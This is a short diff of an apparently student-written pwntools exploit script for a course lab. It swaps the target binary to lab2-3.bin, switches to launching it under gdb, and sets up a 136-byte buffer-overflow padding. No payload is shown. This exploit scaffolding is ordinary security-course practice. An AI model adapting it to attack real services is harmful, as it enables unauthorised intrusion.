@@ -3,7 +3,7 @@ from pwn import *
 if __name__ == "__main__":
 
     # Declaring some variables that will be used later.
-    local_binary_file = "./lab2-2.bin"
+    local_binary_file = "./lab2-3.bin"
     remote_server = "csc748.hostbin.org"
     remote_port = 7023
 
@@ -32,8 +32,8 @@ if __name__ == "__main__":
     
     # I can now run the process. The following lines are various forms for different purposes.
     # process_to_exploit = remote(remote_server, remote_port)
-    process_to_exploit = process(local_binary_file)
-    # process_to_exploit = gdb.debug(local_binary_file)
+    # process_to_exploit = process(local_binary_file)
+    process_to_exploit = gdb.debug(local_binary_file)
 
     # To overflow the buffer, I prepare to send 128+8 bytes.
     buffer_overflower = b"0"*136
